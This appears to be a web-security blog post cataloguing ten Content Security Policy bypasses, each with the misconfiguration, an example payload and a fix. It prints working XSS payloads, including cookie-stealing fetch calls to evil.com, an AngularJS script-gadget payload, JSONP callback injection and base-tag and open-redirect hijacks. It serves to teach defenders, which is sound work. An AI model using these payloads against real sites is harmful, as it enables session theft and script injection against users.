---
title: "The Attacker's Guide to CSP: 10 Misconfigurations That Hand Them Full Script Execution"
tags:
  - security
  - CSP
  - XSS
  - bypass
  - web-security
  - exploitation
  - content-security-policy
  - vulnerability-research
---

**Challenge to the reader:** Take your site's CSP header and paste it into [Google's CSP Evaluator](https://csp-evaluator.withgoogle.com/). If it reports anything other than "all good" for `script-src`, you have a bypass surface. Count the warnings — each one is a technique in this post. Keep that number in mind.

---

Research shows approximately **94.7% of deployed CSPs** that attempt to restrict script execution are ineffective due to configuration weaknesses. That's not because CSP is fundamentally broken — it's because every directive has a bypass vector, and most policies accidentally enable at least one.

This post catalogs the ten most common CSP bypass techniques from the attacker's perspective: the misconfiguration, the payload, and exactly why it works. For context on what CSP is supposed to block, start with **[how CSP disarms each XSS vector](/2026/07/12/ten-browser-features-csp-disables.html)**. For step-by-step hardening instructions, see the **[practical mitigation guide](/2026/07/12/csp-lockdown-mitigation-guide.html)**.

---

## The Bypass Landscape at a Glance

| Bypass Technique | CSP Misconfiguration | Example Payload | Effective Mitigation |
|---|---|---|---|
| `unsafe-inline` | `script-src` includes `'unsafe-inline'` | `<script>alert(1)</script>` | Remove `'unsafe-inline'`; use nonces or hashes |
| `unsafe-eval` | `script-src` includes `'unsafe-eval'` | `eval('alert(1)')` | Remove `'unsafe-eval'`; replace with `JSON.parse()` |
| Wildcard `script-src` | `script-src` contains `*` | `<script src='https://evil.com/payload.js'>` | Remove wildcards; use nonces + `strict-dynamic` |
| Missing `object-src` | No `object-src` or `default-src` | `<object data='data:text/html;base64,...'>` | Set `object-src 'none'` |
| JSONP endpoints | Whitelisted domain hosts JSONP API | `<script src='trusted.com/api?callback=alert(1)//'>` | Avoid domain whitelists; use nonces + `strict-dynamic` |
| File upload bypass | `script-src 'self'` + file upload feature | Upload evil.js, then `<script src='/uploads/evil.js'>` | Validate file types; serve uploads from different origin |
| CDN script gadgets | CDN hosts JS frameworks (AngularJS, Vue) | Load AngularJS from CDN, use `ng-focus` for RCE | Use nonces + `strict-dynamic`; avoid domain whitelists |
| Missing `base-uri` | No `base-uri` directive | `<base href='https://evil.com/'>` hijacks relative URLs | Set `base-uri 'self'` or `'none'` |
| `data:` URI scripts | `script-src` allows `data:` scheme | `<script src='data:;base64,YWxlcnQoMSk='>` | Remove `data:` from `script-src` |
| Open redirect + trusted domain | Whitelisted domain has open redirect | `<script src='trusted.com/redirect?url=evil.com/payload.js'>` | Use nonces + `strict-dynamic`; audit whitelisted domains |

---

## 1. `unsafe-inline` — The Nuclear Option

**The misconfiguration:** Including `'unsafe-inline'` in `script-src` allows inline `<script>` blocks, inline event handlers (`onclick`, `onerror`), and `javascript:` URIs to execute freely. This is the most common CSP mistake because many frameworks' "quick start" guides include it to avoid teaching nonce management.

```http
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline';
```

**The attack:** Any HTML injection point — a comment, a profile field, a reflected query parameter — becomes a full XSS primitive:

```html
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

No bypass trick needed. The policy explicitly permits what it was supposed to block.

**The fix:** Replace `'unsafe-inline'` with per-request cryptographic nonces:

```http
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m123';
```

Each legitimate script tag carries the matching nonce. Injected scripts — which don't know the nonce — are blocked by the browser before execution begins.

---

## 2. `unsafe-eval` — The Backdoor for Dynamic Code

**The misconfiguration:** When `'unsafe-eval'` is present, attackers can use `eval()`, `new Function()`, and `setTimeout('code')` to execute arbitrary JavaScript. This is dangerous in applications that concatenate user input into eval'd strings.

```http
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval';
```

**The attack:** If any server-side or DOM-based code path passes user input to `eval()`:

```javascript
eval("renderTemplate(" + userInput + ")");  // userInput = "1);fetch('https://evil.com/?c='+document.cookie)//"
```

**The fix:** Remove `'unsafe-eval'`. Replace `eval(JSON_string)` with `JSON.parse()`. Refactor `new Function()` constructors to use static function definitions.

---

## 3. Wildcard `script-src` — Trusting Everyone

**The misconfiguration:** A wildcard in `script-src` allows scripts from any origin:

```http
Content-Security-Policy: default-src 'none'; script-src *;
```

**The attack:** The attacker hosts a payload script on any domain they control:

```html
<script src="https://evil.com/payload.js"></script>
```

The browser loads and executes it without question — the wildcard explicitly authorized it.

**The fix:** Remove all wildcards. Use nonces with `strict-dynamic`:

```http
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

---

## 4. Missing `object-src` — The Forgotten Plugin Door

**The misconfiguration:** Without `object-src` or `default-src`, `<object>`, `<embed>`, and `<applet>` elements are completely unrestricted. This is the most commonly forgotten directive.

**The attack:** The attacker injects an `<object>` tag that loads a `data:` URI containing base64-encoded HTML with JavaScript:

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

The browser loads a full HTML sub-document inside the `<object>` that executes scripts — and `script-src` does not restrict this because the sub-document has its own JavaScript execution context.

**The fix:** `object-src 'none'` eliminates the entire plugin attack surface. There is almost no modern application that legitimately needs `<object>` for plugins.

---

## 5. JSONP Endpoint Abuse — Trusted Domain, Hostile Code

**The misconfiguration:** A whitelisted domain hosts a JSONP API endpoint. JSONP works by wrapping a JSON response in a user-controlled callback function — which means the JSONP endpoint inherently **reflects attacker-controlled code** into a script response.

```http
Content-Security-Policy: script-src 'self' https://accounts.google.com;
```

**The attack:**

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>
```

The response body is `alert(1)//({...})` — valid JavaScript that executes `alert(1)` before the comment swallows the JSON payload. The browser sees a script loaded from a whitelisted domain and executes it. The `Content-Type` header is `application/javascript` — perfectly legitimate to the browser.

**Why this is a type confusion at heart:** JSONP confuses **data** (JSON) with **code** (JavaScript). The server intends to return data wrapped in a callback; the attacker provides the callback and converts the entire response into executable code. The CSP trusts the *origin*, not the *content*.

**The fix:** Avoid whitelisting domains with JSONP endpoints. Use nonces with `strict-dynamic` instead of domain allow-lists:

```http
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

---

## 6. File Upload Bypass — Your Own Server as the Attack Host

**The misconfiguration:** With `script-src 'self'`, any JavaScript file hosted on the same origin is an authorized script source. If the application has a file upload feature that accepts `.js` files (or fails to validate file types), the attacker uploads malicious JavaScript and references it as a script tag:

```html
<script src="/uploads/avatar_123.js"></script>
```

**The attack chain:**
1. Attacker registers an account
2. Attacker uploads "profile picture" that is actually `payload.js`
3. Attacker injects `<script src="/uploads/avatar_123.js">` via an XSS or HTML injection point
4. The browser loads the script from `'self'` — fully compliant with the CSP

**The fix:** Validate uploaded file types strictly (not just by extension — check magic bytes). Serve uploaded files from a separate origin (e.g., `uploads-cdn.example.com`) that is explicitly excluded from `script-src`. Even better: store uploads in object storage (S3/GCS) on a separate domain.

---

## 7. CDN Script Gadgets — When Trusted Code Turns Hostile

**The misconfiguration:** Whitelisting CDN domains like `cdnjs.cloudflare.com` or `cdn.jsdelivr.net` in `script-src`. These CDNs host thousands of JavaScript libraries — including ones with known "script gadget" behaviors.

**The attack:** The attacker loads a framework from the whitelisted CDN that has built-in capabilities to evaluate strings as code. AngularJS is the most notorious:

```html
<!-- Load AngularJS from whitelisted CDN -->
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
<!-- Use ng-focus + orderBy to execute arbitrary JavaScript -->
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
</div>
```

The `ng-focus` directive is processed internally by AngularJS — not by the browser's inline event handler mechanism — so CSP's inline script blocking doesn't apply. The `orderBy` filter traversal reaches the `window` object, and `Array.from()` indirectly calls `alert`. This is **100% CSP-compliant** — no directive is violated.

Google's research identified script gadgets in Angular, Vue.js, Aurelia, Polymer, Knockout, jQuery Mobile, and others that bypass CSP whitelists, nonces, `unsafe-eval`, and even `strict-dynamic` in some configurations.

**The fix:** Avoid domain-based allow-lists entirely. Use nonces with `strict-dynamic`, which allows only scripts loaded by already-trusted (nonced) scripts to execute — the attacker's injected `<script>` tag is missing the nonce and is blocked before it ever loads AngularJS.

```http
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

---

## 8. Missing `base-uri` — The One-Directive Pivot Attack

**The misconfiguration:** No `base-uri` directive. This directive does NOT inherit from `default-src`, so omitting it leaves it unrestricted regardless of how strict the rest of your policy is.

**The attack:**

```html
<base href="https://evil.com/">
<!-- Every relative URL on the page now resolves against evil.com -->
<script src="/js/app.js">  <!-- loads from https://evil.com/js/app.js -->
```

The attacker doesn't need to inject a script — they just need to redirect where the existing scripts load from. The CSP sees scripts loading from the original domain (`'self'`) since the `<base>` tag tricks the browser into resolving the URL differently.

**The fix:** Set `base-uri 'self'` or `base-uri 'none'` explicitly:

```http
Content-Security-Policy: base-uri 'self';
```

---

## 9. `data:` URI Scripts — The Self-Contained Payload

**The misconfiguration:** Allowing `data:` in `script-src`. The `data:` scheme embeds content directly in the URL, effectively making it an inline script delivered through a URL:

```http
Content-Security-Policy: script-src 'self' data:;
```

**The attack:**

```html
<script src="data:;base64,YWxlcnQoMSk="></script>
```

The base64 decodes to `alert(1)`. The browser loads the script from a `data:` URI — which the CSP explicitly allows. No external domain needed, no nonce bypass needed.

**The fix:** Never allow `data:` in `script-src`. Allow `data:` only in `img-src` or `font-src` if needed:

```http
Content-Security-Policy: script-src 'self'; img-src 'self' data:;
```

---

## 10. Open Redirect + Trusted Domain — Two Wrongs Make a Bypass

**The misconfiguration:** A whitelisted domain has an open redirect vulnerability. The CSP trusts the domain; the domain trusts the attacker's redirect target.

```http
Content-Security-Policy: script-src 'self' https://trusted.com;
```

**The attack:**

```html
<script src="https://trusted.com/redirect?url=https://evil.com/payload.js"></script>
```

From the browser's perspective: the initial request goes to `trusted.com` (whitelisted ✓). The server responds with a `302 Found` to `evil.com`. The browser follows the redirect. What happens next depends on the browser's CSP implementation — some follow the redirect chain and check the final origin against the policy, but others only check the initial URL.

Even in implementations that check the final URL, if `evil.com` is also on a whitelist (perhaps via a CDN), the chain validates. Multiple Pwn2Own-class bypasses have chained open redirects with overly broad CDN whitelists.

**The fix:** Use nonces with `strict-dynamic` instead of domain allow-lists — the nonce check happens before any network request, making redirect chains irrelevant. If domain allow-listing is unavoidable, audit every whitelisted domain for open redirects.

---

## Why These All Work: The Architecture Problem

Every bypass above exploits the same architectural weakness: CSP's domain-based allow-list model assumes that **trusted origin = safe code**. This assumption fails for at least five reasons:

1. **JSONP endpoints** on trusted domains serve attacker-controlled callbacks
2. **Open redirects** on trusted domains forward to attacker-controlled servers
3. **File uploads** on 'self' let attackers host scripts on your origin
4. **CDNs** host thousands of libraries — some with script-gadget behaviors
5. **`data:` URIs** bypass origin checks entirely by embedding code in the URL

The common thread: CSP's domain-based model evaluates *where code comes from*, not *what the code does*. The attacker doesn't break the policy — they satisfy it, using domains the policy itself authorized.

**Challenge:** Take each of the five trust-model failures above. For your application, answer: (a) Is this failure mode present? (b) If you discovered it, what would you do? (c) Why haven't you already checked? The gap between (b) and (c) is your real security posture.

---

## The Escape Hatch: `strict-dynamic`

The `'strict-dynamic'` keyword fundamentally changes CSP's trust model from *origin-based* to *capability-based*:

- Without `strict-dynamic`: "Trust code from these domains"
- With `strict-dynamic`: "Trust code that was loaded by code I already trust"

A script loaded with a valid nonce can programmatically create additional `<script>` elements, and those dynamically-created scripts inherit trust. No domain whitelist needed. No JSONP bypass possible (the JSONP endpoint isn't loaded by a nonced script). No open redirect chain possible (the nonce check gates everything).

This single keyword eliminates bypasses 5, 7, and 10 from the table above — half the bypasses that don't involve explicitly dangerous keywords like `'unsafe-inline'`.

---

## Source: The Full Bypass Test Suite

A companion test suite demonstrating all ten bypasses against a deliberately-misconfigured server — including Docker Compose setup, per-directive test cases, and expected success/failure outputs — is available at:

**[https://github.com/tthtlc/csp-bypass-test-suite](https://github.com/tthtlc/csp-bypass-test-suite)**

Run `./test_all.sh` to see exactly which bypasses succeed against your current policy.

**Final challenge:** Pick the bypass from this catalog that you think is least likely to exist in your application. Now go look. The one you're most confident doesn't exist is the one you haven't checked. If you find nothing, good. If you find something, you just prevented an incident. Either way, the look was worth it.
